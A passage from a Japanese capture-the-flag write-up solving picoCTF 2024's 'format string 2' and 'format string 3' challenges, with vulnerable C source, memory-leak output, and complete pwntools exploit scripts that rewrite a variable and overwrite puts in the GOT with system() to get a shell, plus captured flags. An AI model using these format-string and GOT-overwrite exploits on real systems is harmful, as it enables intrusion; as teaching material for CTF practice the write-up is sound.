class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sus = 0x%x\n&quot;</span>, sus);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can do better!\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>printf(buf);</code> の行が書式文字列できる。</p>
<p>書式文字列攻撃で <code>sus</code> を 0x67616c66 に書き換えるのがゴール。</p>
<p>解き方は↓</p>
<p><a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-pwn-reverse-e0fd38c4a24040679c0e45eed3c8d7ab#76a5dedf5ccb405990a012f0c1de1b6e">テンプレ: 書式文字列攻撃で（戻り値アドレスなど）任意の領域を書き換える</a></p>
<hr>
<p><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload">fmtstr_payload(offset, {addr: value})</a> に渡す引数を探る。</p>
<ul>
<li>offset: 14<ul>
<li>下記「実行結果1」で、14番目の %p が <code>0x70252c70252c7025 (= &quot;%p,%p,%p&quot; のリトルエンディアン)</code> となっているため</li>
</ul>
</li>
<li>addr: 0x401273 + 0x2de7 + 0x6<ul>
<li>checksec 結果が No PIE になっているので固定アドレス。</li>
<li>下記「ディスアセンブル結果」の <code>*main + 125</code> のアドレス (rip &#x3D; 0x0000000000401273) にて、 <code>sus</code> の値を取得するときに <code>rip+0x2de7</code> としているから。</li>
<li>最後の +0x6 は <code>&quot;sus = 0x%x\\n&quot;</code> の出力を見ながらの試行錯誤…</li>
</ul>
</li>
<li>value: 0x67616c66</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 実行結果1</span></span><br><span class="line">% ./vuln</span><br><span class="line">You don<span class="string">&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span></span><br><span class="line"><span class="string">%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,</span></span><br><span class="line"><span class="string">Here&#x27;</span>s your input: 0x7ffcc929a200,(nil),(nil),0x54,0x7f1f55b4baa0,0x7f1f55ba7658,0x7ffc00000000,0x7f1f55ba72d0,0xffffffff,0x7f1f55b747b0,0x7f1f55ba6ab0,0x1,0x7ffcc929a510,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x2c70252c,0x7f1f55b82f08,0x7f1f55b72140,0xffffffff,0x7ffcc929a4e0,</span><br><span class="line">sus = 0x21737573</span><br><span class="line">You can <span class="keyword">do</span> better!</span><br></pre></td></tr></table></figure>

<p>ということで、↓のコードを書く。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Run local executable.</span></span><br><span class="line"><span class="comment">##   ./exploit.py LOCAL EXE=./executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run remote (with local executable for addresses)</span></span><br><span class="line"><span class="comment">##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run with GDB script.</span></span><br><span class="line"><span class="comment">##   ./exploit.py GDB</span></span><br><span class="line"><span class="comment">## --- (Edit GDB script if necessary) --------------------------------</span></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>.format(</span><br><span class="line">    **locals()</span><br><span class="line">)</span><br><span class="line"><span class="comment">## -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">## --- (do not edit) ---------------------------------------------------</span></span><br><span class="line">exe = context.binary = ELF(args.EXE)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="built_in">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    host = args.HOST</span><br><span class="line">    port = int(args.PORT)</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="built_in">return</span> io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="built_in">return</span> start_local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="comment">## -----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## EXPLOIT GOES HERE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 書式文字列攻撃 (任意アドレスの値書き換え)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## param: printf()に &quot;%p,%p,...&quot; を渡したときに、何番目の %p (1-origin) が `0x70252c70252c7025` (= &quot;%p,%p,%p&quot; のリトルエンディアン) となるか</span></span><br><span class="line">offset = 14</span><br><span class="line"><span class="comment">## param: 書き換えたいアドレス</span></span><br><span class="line">addr = 0x401273 + 0x2DE7 + 0x6  <span class="comment"># 最後の +0x6 は、 `&quot;sus = 0x%x\n&quot;` の出力を見ながらの試行錯誤</span></span><br><span class="line"><span class="comment">## param: 書き換えたい値</span></span><br><span class="line">value = p32(0x67616C66)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: value&#125;)</span><br><span class="line">log.info(f<span class="string">&quot;payload: &#123;payload&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## param: バナー</span></span><br><span class="line">io.sendlineafter(</span><br><span class="line">    b<span class="string">&quot;You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n&quot;</span>,</span><br><span class="line">    payload,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall())</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>

<p>実行してフラグゲット。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">% python exploit.py HOST=rhea.picoctf.net PORT=65080 EXE=./vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/laysakura/share/picoCTF2024/pwn/448-format-string-2/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to rhea.picoctf.net on port 65080: Done</span><br><span class="line">[*] payload: b<span class="string">&#x27;%97c%19$hhn%5c%20$hhnc%21$hhn%5c%22$hhnab@@\x00\x00\x00\x00\x00`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">[+] Receiving all data: Done (242B)</span><br><span class="line">[*] Closed connection to rhea.picoctf.net port 65080</span><br><span class="line">b<span class="string">&quot;Here&#x27;s your input:                                                                                                 u    \x00c    \x00ab@@\nI have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF&#123;f0rm47_57r?_f0rm47_m3m_99fd82cd&#125;&quot;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}

</aside>

<h3><span id="format-string-3">format string 3</span></h3><img src="/img/2024/03-27/Untitled%2056.png" width="550px" height="auto"> 

<p>添付されているのは</p>
<ul>
<li>実行ファイル</li>
<li>Cソースコード</li>
<li>libc.so.6</li>
<li>ld-linux-x86-64.so.2</li>
</ul>
<p>ソースコードはこれ。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_STRINGS 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *normal_string = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Howdy gamers!&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Okay I&#x27;ll be nice. Here&#x27;s the address of setvbuf in libc: %p\n&quot;</span>, &amp;setvbuf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> *all_strings[MAX_STRINGS] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">	setup();</span><br><span class="line">	hello();	</span><br><span class="line"></span><br><span class="line">	fgets(buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(normal_string);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>以下、方針。</p>
<ol>
<li>GOT Overwriteで、printf() の直後に呼び出される puts() のアドレスを system() 関数のアドレスに書き換える（書式文字列攻撃 + GOT Overwrite）<ol>
<li>system() の引数はコード中の <code>normal_string</code> の “&#x2F;bin&#x2F;sh” がそのまま使える</li>
</ol>
</li>
</ol>
<hr>
<p><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload">fmtstr_payload(offset, {addr: value})</a> に渡す引数を探る。</p>
<ul>
<li>offset: 38<ul>
<li>下記「実行結果1」で、38番目の %p が <code>0x70252c70252c7025 (= &quot;%p,%p,%p&quot; のリトルエンディアン)</code> となっているため</li>
</ul>
</li>
<li>addr: 0x404018<ul>
<li>下記「実行結果2」で、PLTにおける puts() のアドレスが 0x404018 とわかるので</li>
</ul>
</li>
<li>value: （libcの中のsystem関数のアドレスを実行時に特定）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 実行結果1</span></span><br><span class="line">% ./format-string-3</span><br><span class="line">Howdy gamers!</span><br><span class="line">Okay I<span class="string">&#x27;ll be nice. Here&#x27;</span>s the address of setvbuf <span class="keyword">in</span> libc: 0x7f0e6380a3f0</span><br><span class="line">%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,</span><br><span class="line">0x7f0e63968963,0xfbad208b,0x7ffdfd22aa00,0x1,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0xa,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),0xcc5ba3e9a9567f00,0x1,</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 実行結果2</span></span><br><span class="line">% readelf -r format-string-3</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rela.dyn&#x27;</span> at offset 0x15d8 contains 6 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000403fe8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0</span><br><span class="line">000000403ff0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line">000000403ff8  000800000006 R_X86_64_GLOB_DAT 0000000000000000 setvbuf@GLIBC_2.2.5 + 0</span><br><span class="line">000000404060  000700000005 R_X86_64_COPY     0000000000404060 stdout@GLIBC_2.2.5 + 0</span><br><span class="line">000000404070  000900000005 R_X86_64_COPY     0000000000404070 stdin@GLIBC_2.2.5 + 0</span><br><span class="line">000000404080  000a00000005 R_X86_64_COPY     0000000000404080 stderr@GLIBC_2.2.5 + 0</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rela.plt&#x27;</span> at offset 0x1668 contains 4 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0</span><br><span class="line">000000404020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0</span><br><span class="line">000000404028  000400000007 R_X86_64_JUMP_SLO 0000000000000000 <span class="built_in">printf</span>@GLIBC_2.2.5 + 0</span><br><span class="line">000000404030  000500000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0</span><br></pre></td></tr></table></figure>

<hr>
<p>攻撃コードは以下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Run local executable.</span></span><br><span class="line"><span class="comment">##   ./exploit.py LOCAL EXE=./executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run remote (with local executable for addresses)</span></span><br><span class="line"><span class="comment">##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run with GDB script.</span></span><br><span class="line"><span class="comment">##   ./exploit.py GDB</span></span><br><span class="line"><span class="comment">## --- (Edit GDB script if necessary) --------------------------------</span></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *main+160</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">p system</span></span><br><span class="line"><span class="string">p $rbp</span></span><br><span class="line"><span class="string">x/5gx $rbp+8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    **<span class="built_in">locals</span>()</span><br><span class="line">)</span><br><span class="line"><span class="comment">## -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">## --- (do not edit) ---------------------------------------------------</span></span><br><span class="line">exe = context.binary = ELF(args.EXE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    host = args.HOST</span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT)</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> start_local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="comment">## -----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## EXPLOIT GOES HERE</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 1. system関数のアドレスを取得</span></span><br><span class="line">io.recvline()</span><br><span class="line">setbuf_addr_line = io.recvline().decode(<span class="string">&quot;utf-8&quot;</span>).rstrip()</span><br><span class="line">log.info(setbuf_addr_line)</span><br><span class="line">setbuf_addr_str = setbuf_addr_line.split(</span><br><span class="line">    <span class="string">&quot;Okay I&#x27;ll be nice. Here&#x27;s the address of setvbuf in libc: &quot;</span></span><br><span class="line">)[-<span class="number">1</span>]</span><br><span class="line">servbuf_addr = <span class="built_in">int</span>(setbuf_addr_str[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot;setvbuf() address: <span class="subst">&#123;<span class="built_in">hex</span>(servbuf_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = servbuf_addr - libc.symbols[<span class="string">&quot;setvbuf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.info(<span class="string">f&quot;system()  address: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 2. 書式文字列攻撃 (任意アドレスの値書き換え + GOT Overwrite)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## param: printf()に &quot;%p,%p,...&quot; を渡したときに、何番目の %p (1-origin) が `0x70252c70252c7025` (= &quot;%p,%p,%p&quot; のリトルエンディアン) となるか</span></span><br><span class="line">offset = <span class="number">38</span></span><br><span class="line"><span class="comment">## param: 書き換えたいアドレス</span></span><br><span class="line">addr = <span class="number">0x404018</span></span><br><span class="line"><span class="comment">## param: 書き換えたい値</span></span><br><span class="line">value = p64(system_addr)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: value&#125;)</span><br><span class="line">log.info(<span class="string">f&quot;payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>実行してシェルを奪い、フラグゲット。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">% python exploit.py EXE=./format-string-3 HOST=rhea.picoctf.net PORT=65378</span><br><span class="line">[*] <span class="string">&#x27;/home/laysakura/share/picoCTF2024/pwn/449-format-string-3/format-string-3&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;.&#x27;</span></span><br><span class="line">[+] Opening connection to rhea.picoctf.net on port 65378: Done</span><br><span class="line">[*] <span class="string">&#x27;/home/laysakura/share/picoCTF2024/pwn/449-format-string-3/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    